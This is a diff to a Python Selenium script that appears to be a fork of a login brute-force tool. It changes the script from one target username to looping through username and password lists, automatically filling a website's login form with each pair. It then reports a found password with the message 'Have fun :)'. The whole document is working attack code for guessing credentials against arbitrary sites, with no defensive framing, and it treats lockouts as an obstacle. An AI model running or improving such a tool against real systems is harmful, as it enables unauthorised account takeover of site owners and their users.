@@ -34,7 +34,8 @@ parser = argparse.ArgumentParser()
 now = datetime.datetime.now()
 
 #Args
-parser.add_argument("-u", "--username", dest="username",help="Choose the username")
+parser.add_argument("--username_list", dest="username_list",help="Enter the username list directory")
+# parser.add_argument("-u", "--username", dest="username",help="Choose the username")
 parser.add_argument("--usernamesel", dest="usernamesel",help="Choose the username selector")
 parser.add_argument("--passsel", dest="passsel",help="Choose the password selector")
 parser.add_argument("--loginsel", dest="loginsel",help= "Choose the login button selector")
@@ -69,54 +70,80 @@ def wizard():
     username_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
     password_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
     login_btn_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
-    username = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
+    username_list = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username list to brute-force: ')
     pass_list = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
-    brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
+    brutes(username_list, username_selector ,password_selector,login_btn_selector,pass_list, website)
 
-def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
-    f = open(pass_list, 'r')
+
+def brutes(username_list, username_selector, password_selector, login_btn_selector, pass_list, website):
+    with open(username_list, 'r') as u, open(pass_list, 'r') as p:
+        usernames = u.readlines()
+        passwords = p.readlines()
+
     optionss = webdriver.ChromeOptions()
     optionss.add_argument("--disable-popup-blocking")
     optionss.add_argument("--disable-extensions")
-    browser = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=optionss) #use only options instead of chrome_options
-    # Rest of the code remains the same...
+    browser = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=optionss)
     wait = WebDriverWait(browser, 10)
-    while True:
-        try:
-            for line in f:
+
+    for username in usernames:
+        for password in passwords:
+            try:
                 browser.get(website)
                 wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
-                Sel_user = browser.find_element(By.CSS_SELECTOR, username_selector) #Finds Selector (use .find_element(By.CSS_SELECTOR, "selector") instead of .find_element_by_css_selector("selector"))
-                Sel_pas = browser.find_element(By.CSS_SELECTOR, password_selector) #Finds Selector
-                enter = browser.find_element(By.CSS_SELECTOR, login_btn_selector) #Finds Selector
+                Sel_user = browser.find_element(By.CSS_SELECTOR, username_selector)
+                Sel_pas = browser.find_element(By.CSS_SELECTOR, password_selector)
+                enter = browser.find_element(By.CSS_SELECTOR, login_btn_selector)
+
                 Sel_user.send_keys(username)
-                Sel_pas.send_keys(line)
-                print ('------------------------')
-                print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
-                print ('------------------------')
-        except KeyboardInterrupt: #returns to main menu if ctrl C is used
-            print('CTRL C')
-            break
-        except selenium.common.exceptions.NoSuchElementException:
-            print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
-            print ('LAST PASS ATTEMPT BELLOW')
-            print (color.GREEN + 'Password has been found: {0}'.format(line))
-            print (color.YELLOW + 'Have fun :)')
-            exit()
+                Sel_pas.send_keys(password)
+
+                
+                # t.sleep(1)
+                # Check for successful login by observing changes in the page
+                # You may need to customize this based on the behavior of the website
+                # if "Login Successful" in browser.page_source:
+                if browser.find_elements(By.CSS_SELECTOR, success_selector):
+                    print(color.BLUE +'------------------------')
+                    print(color.BLUE + 'Password found: ' + color.GREEN + password.strip() + color.BLUE +
+                          ' for user: ' + color.GREEN + username.strip())
+                    print(color.BLUE +'------------------------')
+                    # browser.quit()
+                    exit()
+                    break
+
+                print('------------------------')
+                print(color.GREEN + 'Tried password: ' + color.RED + password.strip() + color.GREEN +
+                      ' for user: ' + color.RED + username.strip())
+                print('------------------------')
+
+            except KeyboardInterrupt:
+                print('CTRL C')
+                break
+
+            except NoSuchElementException:
+                print('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE. '
+                      'THIS COULD MEAN 2 THINGS: THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS!')
+                print('LAST PASS ATTEMPT BELOW')
+                print(color.GREEN + 'Password has been found: {0}'.format(password))
+                print(color.YELLOW + 'Have fun :)')
+                # browser.quit()  
+                exit()
+
+success_selector = "#content > nav > form > div > input"
 
 banner = color.BOLD + color.RED +'''
-   _____                 
- |__  /           
-   / /   
- / /_    
-/____|  
-
-
-  {0}[{1}-{2}]--> {3}V.2.0
+  _    _       _       _
+ | |  | |     | |     | |
+ | |__| | __ _| |_ ___| |__
+ |  __  |/ _` | __/ __| '_ \\
+ | |  | | (_| | || (__| | | |
+ |_|  |_|\__,_|\__\___|_| |_|
+  {0}[{1}-{2}]--> {3}V.1.0
   {4}[{5}-{6}]--> {7}coded by Metachar
   {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)
 
-if options.username == None:
+if options.username_list == None:
     if options.usernamesel == None:
         if options.passsel == None:
             if options.loginsel == None:
@@ -125,11 +152,12 @@ if options.username == None:
                         wizard()
 
 
-username = options.username
+username_list = options.username_list
 username_selector = options.usernamesel
 password_selector = options.passsel
 login_btn_selector = options.loginsel
 website = options.website
 pass_list = options.passlist
 print (banner)
-brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
+brutes(username_list, username_selector ,password_selector,login_btn_selector,pass_list, website)
+
